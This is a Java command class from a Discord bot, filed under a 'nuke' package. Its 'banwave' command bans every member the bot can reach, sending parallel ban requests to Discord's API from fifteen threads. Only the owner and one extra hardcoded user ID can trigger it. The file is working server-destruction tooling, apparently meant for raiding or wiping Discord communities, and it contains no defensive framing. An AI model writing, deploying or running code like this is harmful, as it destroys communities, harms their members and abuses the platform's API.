package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Config;
import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import me.comu.exeter.logging.Logger;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import java.io.IOException;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.stream.Collectors;

public class BanwaveCommand implements ICommand {

    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("698607465885073489")) {
            return;
        }

        Logger.getLogger().print("Initiating Ban Wave...");
        List<String> members = event.getGuild().getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member))).map(member -> member.getId()).collect(Collectors.toList());
// Lists.partition(members, 25).parallelStream().forEach({
//
//                };
            ExecutorService executorService = Executors.newFixedThreadPool(15);
        Runnable wave = () -> {
            for (String member : members) {
                OkHttpClient client = new OkHttpClient();
                Request request = new Request.Builder()
                        .url(String.format("https://discord.com/api/v7/guilds/%s/bans/%s", event.getGuild().getId(), member))
                        .put(RequestBody.create(null, ""))
                        .addHeader("Authorization", "Bot " + Config.get("TOKEN"))
                        .build();
                try {
                    Response response = client.newCall(request).execute();
                    if (response.isSuccessful()) {
                        Logger.getLogger().print("Banned " + member + "\n" + response.body() + "\n");
                    } else {
                        Logger.getLogger().print(response.message());
                    }

                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }
        };
        for (int i = 0; i < 15; i++) {
            executorService.submit(wave);
        }


    }


    @Override
    public String getHelp() {
        return "Use at your own risk\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "etb";
    }

    @Override
    public String[] getAlias() {
        return new String[]{"bw", "banwave"};
    }

    @Override
    public Category getCategory() {
        return Category.OWNER;
    }
}

